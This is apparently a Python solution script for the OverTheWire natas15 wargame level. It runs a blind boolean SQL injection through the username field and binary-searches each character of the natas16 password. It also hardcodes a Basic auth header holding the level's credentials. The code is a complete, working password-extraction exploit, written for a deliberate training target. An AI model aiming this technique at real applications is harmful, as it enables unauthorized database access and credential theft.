import requests

res = ""
url = "http://natas15.natas.labs.overthewire.org/index.php"

for cur in range(1,33):
    mini = 0
    maxi = 127
    while mini < maxi:
        mid = (mini + maxi) // 2
        payload = {"username": 'natas16" AND ASCII(SUBSTRING(password, ' + str(cur) + ', 1)) <= ' + str(mid) + ' AND "1"="1'}
        headers = {"Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="}
        r = requests.post(url, data=payload, headers=headers)
        if "This user exists" in r.text:
            maxi = mid
        else:
            mini = mid + 1
    res += chr(mini)
    print(mini)
print(res)
